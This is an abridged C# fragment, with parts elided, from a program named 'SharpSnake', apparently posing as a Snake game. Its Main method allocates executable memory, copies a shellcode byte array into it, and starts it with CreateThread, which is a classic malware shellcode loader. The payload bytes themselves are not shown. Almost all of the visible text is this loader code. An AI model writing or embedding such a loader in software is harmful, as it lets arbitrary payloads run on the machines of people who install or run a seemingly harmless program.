...
namespace SharpSnake
{
    ...
    class Program
    {
        ...
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, IntPtr dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
        ...
        static void Main(string[] args)
        {
            ...
            IntPtr codeAddr = VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, codeAddr, shellcode.Length);
            threatHandle = CreateThread(IntPtr.Zero, IntPtr.Zero, codeAddr, parameter, 0, ref threadId);
